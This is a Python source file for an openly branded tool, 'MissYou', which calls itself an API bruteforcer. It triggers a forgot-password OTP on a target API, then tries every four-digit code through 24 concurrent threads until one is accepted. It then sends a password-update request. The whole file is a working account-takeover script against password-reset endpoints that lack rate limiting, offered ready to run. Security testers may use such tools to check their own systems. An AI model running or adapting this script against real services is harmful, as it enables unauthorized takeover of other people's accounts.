import json
import requests
import threading
import os
import sys

##########################################
#       Created By Cod3Br3ak3r           #
#       github.com/codebreaker444        #
##########################################


lock = threading.Semaphore(24)
def cls():
    os.system('cls' if os.name=='nt' else 'clear')
class cb_colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[092m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    COLOR_OFF = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class cb_user_inputs_missyou():
    def main_menu_missyou(self):
        cls()
        hello= '''\033[092m
███╗   ███╗██╗███████╗███████╗██╗   ██╗ ██████╗ ██╗   ██╗\033[96m
████╗ ████║██║██╔════╝██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║
██╔████╔██║██║███████╗███████╗ ╚████╔╝ ██║   ██║██║   ██║\033[092m
██║╚██╔╝██║██║╚════██║╚════██║  ╚██╔╝  ██║   ██║██║   ██║
██║ ╚═╝ ██║██║███████║███████║   ██║   ╚██████╔╝╚██████╔╝\033[96m
╚═╝     ╚═╝╚═╝╚══════╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ 
                                                   \033[95mV 1.0    
\033[93m== API BRUTEFORCER WITH SUPPORT OF CONCURRECT REQUESTS ==  \033[0m
==[[ .:: Name : MissYou ::.]]==\033[96m
==[[ .:: Author : Cod3Br3ak3r ::.]]==\033[92m
==[[ .:: Website : https://govardhanchitrada.me ::.]]==\033[96m
==[[ .:: Github : http://www.github.com/codebreaker444 ::.]]==\033[92m
        '''
        print(hello)
        print("0) Send OTP request to API Endpoint")
        print("1) Bruteforce four digit OTP to API Endpoint")
        print("2) Send update UserPassword request to API Endpoint")
        print(cb_colors.RED+"3) Exit"+cb_colors.BLUE)
        main_value=int(input("> Enter your choice:"))
        if main_value==0:
            cb_user_inputs_missyou.secondary_inputs_missyou(main_value)
        elif main_value == 1:
            cb_user_inputs_missyou.secondary_inputs_missyou(main_value)
        elif main_value == 2:
            cb_user_inputs_missyou.secondary_inputs_missyou(main_value)
        elif main_value == 3:
            print("See you soon!")
            exit(0)
        else:
            print("Wrong Option")
            cls()
            cb_user_inputs_missyou.main_menu_missyou(0)

    def secondary_inputs_missyou(self):
        main_value = self
        main_url = str(input("> Enter Main Url: "))
        try:
            header0 = str(input("> Enter API Endpoint header in JSON format:"))
            header = json.loads(header0)
            if main_value != 1:
                payload0 = str(input("> Enter json parameters in JSON format: "))
                payload = json.loads(payload0)
            else:
                payload0 = str(input("> Enter json parameters in JSON format fill otp key value with any number: "))
                payload = json.loads(payload0)
        except:
            print("Invalid JSON format use Double quotes and Don't copy paste...")
            cb_user_inputs_missyou.secondary_inputs_missyou(0)
        if main_value == 0:
            send_reset_otp_path = str(input("> Enter forgot password otp API Endpoint path(eg: /auth/forgot-password): "))
            cb_main_process_missyou.send_reset_otp_missyou(main_url,send_reset_otp_path,header,payload)
            cb_user_inputs_missyou.main_menu_missyou(0)
        elif main_value == 1:
            verify_reset_code_path = str(input("> Enter verify otp API Endpoint path(eg: /auth/verify-otp): "))
            otp_key = str(input("Enter OTP key name(Eg: code):"+cb_colors.GREEN))
            cb_main_process_missyou.bruteforce_missyou(main_url,verify_reset_code_path,header,payload,otp_key)
            cb_user_inputs_missyou.main_menu_missyou(0)
        elif main_value == 2:
            verify_reset_password_path = str(input("> Enter password change API Endpoint path(eg: /auth/update-password): "))
            cb_main_process_missyou.verify_reset_password_missyou(main_url,verify_reset_password_path,header,payload)
            cb_user_inputs_missyou.main_menu_missyou(0)
        else:
            cb_user_inputs_missyou.main_menu_missyou()

class cb_main_process_missyou():
    def send_reset_otp_missyou(main_url,send_reset_otp_path,head,payload):
        url = main_url + send_reset_otp_path

        payld = json.dumps(payload)
        ret = requests.post(url, headers=head, data=payld)
        ##print(ret.content)
        ##print(ret.status_code)
        data = ret.json()
        if (ret.status_code != 200):
            print("Address Not Found")
            return False
        try:
            if data['response']['success'] == True:
                print(cb_colors.GREEN+"Success"+cb_colors.BLUE, data)
                return True
            else:
                print("Failure")
                return False
        except:
            print("Response Code not found...Dynamic response code not supported at present!..Exiting!")
            exit(0)


    def verify_reset_code_missyou(otp, main_url,verify_reset_code_path,head,payload,otp_key):
        url = main_url + verify_reset_code_path

        payload[otp_key] = otp
        payld = json.dumps(payload)
        ret = requests.post(url, headers=head, data=payld)
        data = ret.json()
        n=9999
        sys.stdout.write('\r' + 'Cracking...  Combinations ' + str(otp) + '/' + str(n) + ' ' + '{:.2f}'.format(int(otp) / n * 100) + '%')
        sys.stdout.flush()
        if ret.status_code != 200:
            return False
        try:
            if data['response']['success'] == True:
                print(cb_colors.GREEN+"Success"+cb_colors.BLUE, data)
                lock.release()
                os._exit(0)
                return True
            else:
                ##print("Failure")
                lock.release()
                return False
        except:
            print("Response Code not found...Dynamic response code not supported at present!..Exiting!")
            os._exit(0)

    def verify_reset_password_missyou(main_url,verify_reset_password_path,head,payload):
        url = main_url + verify_reset_password_path
        payld = json.dumps(payload)
        ret = requests.post(url, headers=head, data=payld)
        if (ret.status_code != 200):
            print("Address Not Found!")
            return False
        else:
            print(ret.content)
            return True
    def bruteforce_missyou(main_url,verify_reset_code_path,header,payload,otp_key):
        codes = []
        print("Generating 4 digit combinations....")
        for i in range(0, 9999):
            if i < 10:
                codes.append("000" + str(i))
            elif i < 100:
                codes.append("00" + str(i))

            elif i < 1000:
                codes.append("0" + str(i))
            else:
                codes.append(str(i))
        ##print(codes)
        cb_main_process_missyou.parse_pool_missyou(codes, main_url,verify_reset_code_path,header,payload,otp_key)

    def parse_pool_missyou(codes, main_url,verify_reset_code_path,header,payload,otp_key):
        thread_pool = []
        for code in codes:
            thread = threading.Thread(target=cb_main_process_missyou.verify_reset_code_missyou, args=(code, main_url,verify_reset_code_path,header,payload,otp_key))
            thread_pool.append(thread)
            thread.start()
            # print("pools_code:",code)

            lock.acquire()

        for thread in thread_pool:
            thread.join()
        print("Done")

cb_user_inputs_missyou.main_menu_missyou(0)

